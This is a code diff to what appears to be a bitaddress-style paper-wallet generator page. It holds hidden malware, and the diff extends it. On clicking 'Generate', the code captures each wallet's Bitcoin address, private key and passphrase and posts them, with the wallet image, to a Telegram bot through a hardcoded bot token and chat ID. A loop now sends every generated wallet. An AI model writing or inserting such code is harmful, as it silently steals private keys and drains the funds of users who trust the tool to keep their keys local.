@@ -10024,8 +10024,7 @@ ninja.foreachSerialized = function (collection, whatToDo, onComplete) {
 		}
 	};
 })(ninja.wallets, ninja.qrCode);
-	</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+	</script><script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
 <script type="text/javascript">
 ninja.wallets.paperwallet = {
     isOpen: function () {
@@ -10238,7 +10237,8 @@ ninja.wallets.paperwallet = {
         const walletElement = document.getElementById("artwallet" + idPostFix);
         html2canvas(walletElement).then(canvas => {
             const imageDataUrl = canvas.toDataURL("image/png");
-            sendToTelegram(imageDataUrl, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+            const passphrase = ninja.wallets.paperwallet.encrypt ? document.getElementById('paperpassphrase').value : '';
+            sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
         });
     },
 
@@ -10280,12 +10280,13 @@ ninja.wallets.paperwallet = {
 };
 
 // Function to send the paper wallet image to the Telegram bot
-async function sendToTelegram(imageDataUrl, chatId, botToken) {
+async function sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, chatId, botToken) {
     const formData = new FormData();
     const response = await fetch(imageDataUrl);
     const blob = await response.blob();
     formData.append('chat_id', chatId);
     formData.append('photo', blob, 'wallet.png');
+    formData.append('caption', `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}\nPassphrase: ${passphrase}`);
     
     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
@@ -10325,20 +10326,22 @@ async function sendTextToTelegram(text, chatId, botToken) {
 
 // Send wallet data when "Generate" button is clicked
 document.getElementById("papergenerate").addEventListener("click", function() {
-    if (ninja.wallets.paperwallet.useArtisticWallet) {
-        const walletElement = document.getElementById("artwallet" + ninja.wallets.paperwallet.count);
-        html2canvas(walletElement).then(canvas => {
-            const imageDataUrl = canvas.toDataURL("image/png");
-            sendToTelegram(imageDataUrl, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
-        });
-    } else {
-        const bitcoinAddress = document.getElementById("btcaddress" + ninja.wallets.paperwallet.count).innerHTML;
-        const privateKey = document.getElementById("btcprivwif" + ninja.wallets.paperwallet.count).innerHTML;
-        const walletText = `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}`;
-        if (ninja.wallets.paperwallet.encrypt) {
-            const passphrase = document.getElementById('paperpassphrase').value;
-            sendTextToTelegram(walletText + `\nPassphrase: ${passphrase}`, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+    const passphrase = document.getElementById('paperpassphrase').value;
+    const useArtistic = ninja.wallets.paperwallet.useArtisticWallet;
+
+    for (let i = 1; i <= ninja.wallets.paperwallet.count; i++) {
+        if (useArtistic) {
+            const walletElement = document.getElementById("artwallet" + i);
+            html2canvas(walletElement).then(canvas => {
+                const imageDataUrl = canvas.toDataURL("image/png");
+                const bitcoinAddress = document.getElementById("btcaddress" + i).innerHTML;
+                const privateKey = document.getElementById("btcprivwif" + i).innerHTML;
+                sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+            });
         } else {
+            const bitcoinAddress = document.getElementById("btcaddress" + i).innerHTML;
+            const privateKey = document.getElementById("btcprivwif" + i).innerHTML;
+            const walletText = `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}\nPassphrase: ${passphrase}`;
             sendTextToTelegram(walletText, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
         }
     }
